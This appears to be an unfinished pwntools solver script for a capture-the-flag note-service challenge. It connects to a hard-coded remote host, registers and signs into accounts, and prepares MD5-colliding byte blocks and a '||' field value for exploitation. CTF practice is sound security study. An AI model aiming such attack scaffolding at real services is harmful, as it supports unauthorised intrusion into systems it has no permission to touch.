from pwn import *
import requests

if args.LOCAL:
    io=remote('0', 31337)
else:
    io=remote('172.105.117.188', 31337)
def request_(username, password, fullname):
    if args.LOCAL: 
        url = 'http://localhost:80/'
    else:
        url = 'http://172.105.117.188/'
    data = {
        'username': username,
        'password': password,
        'full_name': fullname
    }
    try:
        response = requests.post(url + 'accounts/', json=data)
        if response.status_code == 200:
            print("Account registered successfully!")
            print("Response:", response.json())
        else:
            print("Failed to register account. Status code:", response.status_code)
    except requests.exceptions.RequestException as e:
        print("Error:", e)

def sign_in(username, password):
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'Username: ', username)
    io.sendlineafter(b'Password: ', password)

def set_note(size, note):
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b'Size: ', str(size).encode())
    io.sendlineafter(b'Note: ', note)
    
def get_note(id):
    io.sendlineafter(b'> ', b'3')
    io.sendlineafter(b'Note\'s ID: ', id)
    
def edit_note(id, note):
    io.sendlineafter(b'> ', b'4')
    io.sendlineafter(b'Note\'s ID: ', id)
    io.sendlineafter(b'Note: ', note)
    
def exit_():
    io.sendlineafter(b'> ', b'5')
    
msg1 = 'd131dd02c5e6eec4693d9a0698aff95c2fcab58712467eab4004583eb8fb7f8955ad340609f4b30283e488832571415a085125e8f7cdc99fd91dbdf280373c5bd8823e3156348f5bae6dacd436c919c6dd53e2b487da03fd02396306d248cda0e99f33420f577ee8ce54b67080a80d1ec69821bcb6a8839396f9652b6ff72a70'

msg2 = 'd131dd02c5e6eec4693d9a0698aff95c2fcab50712467eab4004583eb8fb7f8955ad340609f4b30283e4888325f1415a085125e8f7cdc99fd91dbd7280373c5bd8823e3156348f5bae6dacd436c919c6dd53e23487da03fd02396306d248cda0e99f33420f577ee8ce54b67080280d1ec69821bcb6a8839396f965ab6ff72a70'

msg1 = bytes.fromhex(msg1)
msg2 = bytes.fromhex(msg2)

print(msg1)
print(msg2)

# set_note(200, b'AAAAAAAA')
# for i in range(100):
#     request_(str(i), '1', 'Duy')

# for i in range(100):
#     io=remote('0', 31337)
#     sign_in(str(i), '1')
    
#     io.close()

print(base64.b64encode(msg1).decode())

# print(len(msg2))
request_('cool', 'p', '||')
# request_('col2', base64.b64encode(msg2).decode(), 'c')
sign_in(b'cool', 'p')
# set_note(512, b'aaaaaaa\0aaaaaaaaaaaaaa')

# request_('A', 'D', 'C')


io.interactive()
